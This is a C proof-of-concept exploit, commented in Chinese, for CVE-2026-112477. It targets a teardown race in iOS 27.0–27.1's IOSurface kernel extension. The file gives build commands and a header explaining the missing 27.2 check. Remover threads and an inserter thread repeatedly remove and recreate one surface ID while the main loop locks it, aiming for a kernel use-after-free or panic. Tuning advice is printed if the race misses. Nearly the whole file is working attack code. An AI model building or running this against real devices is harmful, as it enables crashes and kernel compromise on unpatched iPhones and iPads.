// iosurface_teardown_race.c — 目标 CVE-2026-112477 (iOS 27.0 / 27.0.1 / 27.1)
//
// 目标：CVE-2026-112477（com.apple.iokit.IOSurface）。核心机制：
//   插入路径 27.2:  if (*(u8*)(surface + 0xF1) & 1) return 0xE00002D8;   ← 新增
//   摘除路径 27.2:  *(u8*)(surface + 0xF1) = 1;  然后才拆链             ← 新增
// 27.1 没有该位：摘除流程把 surface 从 hash/list 摘链并释放的过程中，
// lookup/insert 路径仍可命中并把它重新挂回链表 → 悬垂节点 → 内核 UAF。
//
// build: clang -O2 -o iosurface_race iosurface_teardown_race.c \
//          -framework IOKit -framework CoreFoundation -ldl -lpthread

#include <stdio.h>
#include <stdlib.h>
#include <stdint.h>
#include <string.h>
#include <pthread.h>
#include <dlfcn.h>
#include <mach/mach.h>
#include <CoreFoundation/CoreFoundation.h>

typedef mach_port_t IOSurfaceRef;

typedef IOSurfaceRef (*fn_create)(CFDictionaryRef);
typedef IOSurfaceRef (*fn_lookup)(uint32_t);
typedef kern_return_t (*fn_remove)(IOSurfaceRef);
typedef uint32_t (*fn_getid)(IOSurfaceRef);
typedef kern_return_t (*fn_lock)(IOSurfaceRef, uint32_t *, size_t *, uint32_t);
typedef kern_return_t (*fn_unlock)(IOSurfaceRef, uint32_t *, size_t *);

static fn_create kCreate;
static fn_lookup kLookup;
static fn_remove kRemove;
static fn_getid  kGetID;
static fn_lock   kLock;
static fn_unlock kUnlock;

static volatile int      g_stop = 0;
static volatile uint32_t g_id   = 0;

static void load_api(void) {
    void *h = dlopen("/System/Library/Frameworks/IOSurface.framework/IOSurface", RTLD_NOW);
    if (!h) { fprintf(stderr, "dlopen IOSurface failed: %s\n", dlerror()); exit(1); }
    kCreate = (fn_create)dlsym(h, "IOSurfaceCreate");
    kLookup = (fn_lookup)dlsym(h, "IOSurfaceLookup");
    kGetID  = (fn_getid) dlsym(h, "IOSurfaceGetID");
    kLock   = (fn_lock)   dlsym(h, "IOSurfaceLock");
    kUnlock = (fn_unlock) dlsym(h, "IOSurfaceUnlock");
    kRemove = (fn_remove) dlsym(h, "IOSurfaceRemoveSurface");   // 27.x 导出
    if (!kCreate || !kLookup || !kGetID) {
        fprintf(stderr, "dlsym 失败：create=%p lookup=%p getid=%p\n",
                (void*)kCreate, (void*)kLookup, (void*)kGetID);
        exit(1);
    }
    if (!kRemove) fprintf(stderr, "[!] IOSurfaceRemoveSurface 不可用，摘除线程将跳过\n");
}

static CFDictionaryRef make_props(int with_id, uint32_t sid) {
    CFMutableDictionaryRef d = CFDictionaryCreateMutable(NULL, 0,
        &kCFTypeDictionaryKeyCallBacks, &kCFTypeDictionaryValueCallBacks);
    int v;
    v = 64; CFNumberRef w = CFNumberCreate(NULL, kCFNumberIntType, &v);
    v = 64; CFNumberRef h = CFNumberCreate(NULL, kCFNumberIntType, &v);
    v = 4;  CFNumberRef b = CFNumberCreate(NULL, kCFNumberIntType, &v);
    CFDictionarySetValue(d, CFSTR("IOSurfaceWidth"), w);
    CFDictionarySetValue(d, CFSTR("IOSurfaceHeight"), h);
    CFDictionarySetValue(d, CFSTR("IOSurfaceBytesPerElement"), b);
    if (with_id) {
        CFNumberRef idv = CFNumberCreate(NULL, kCFNumberSInt32Type, &sid);
        CFDictionarySetValue(d, CFSTR("IOSurfaceID"), idv);
        CFRelease(idv);
    }
    CFRelease(w); CFRelease(h); CFRelease(b);
    return d;
}

// 摘除线程：反复 lookup + remove 同一 ID（走 27.1 的拆链/释放窗口）
static void *remover(void *arg) {
    (void)arg;
    uint32_t id = g_id;
    while (!g_stop) {
        IOSurfaceRef s = kLookup ? kLookup(id) : 0;
        if (s) {
            if (kRemove) kRemove(s);
            mach_port_deallocate(mach_task_self(), s);
        }
    }
    return NULL;
}

// 重插线程：用同一 IOSurfaceID 反复创建（走插入路径）
static void *inserter(void *arg) {
    (void)arg;
    while (!g_stop) {
        CFDictionaryRef p = make_props(1, g_id);
        IOSurfaceRef s = kCreate(p);
        CFRelease(p);
        if (s) mach_port_deallocate(mach_task_self(), s);
    }
    return NULL;
}

int main(void) {
    load_api();

    CFDictionaryRef seed = make_props(0, 0);
    IOSurfaceRef s = kCreate(seed);
    CFRelease(seed);
    if (!s) { fprintf(stderr, "seed IOSurfaceCreate 失败\n"); return 1; }
    g_id = kGetID(s);
    printf("[*] target IOSurfaceID = 0x%x\n", g_id);

    pthread_t th[3];
    pthread_create(&th[0], NULL, remover, NULL);
    pthread_create(&th[1], NULL, remover, NULL);
    pthread_create(&th[2], NULL, inserter, NULL);

    for (int i = 0; i < 200000; i++) {
        IOSurfaceRef v = kLookup(g_id);
        if (v) {
            if (kLock && kUnlock) {
                uint32_t seed32 = 0; size_t len = 0;
                kLock(v, &seed32, &len, 0);
                kUnlock(v, &seed32, &len);
            }
            mach_port_deallocate(mach_task_self(), v);
        }
        if ((i & 0x3FFF) == 0) printf("  iter %d\n", i);
    }

    g_stop = 1;
    for (int i = 0; i < 3; i++) pthread_join(th[i], NULL);
    printf("[*] done — 无 panic 说明竞态窗口未命中，调 RACE 线程数/CPU 亲和再加压\n");
    return 0;
}
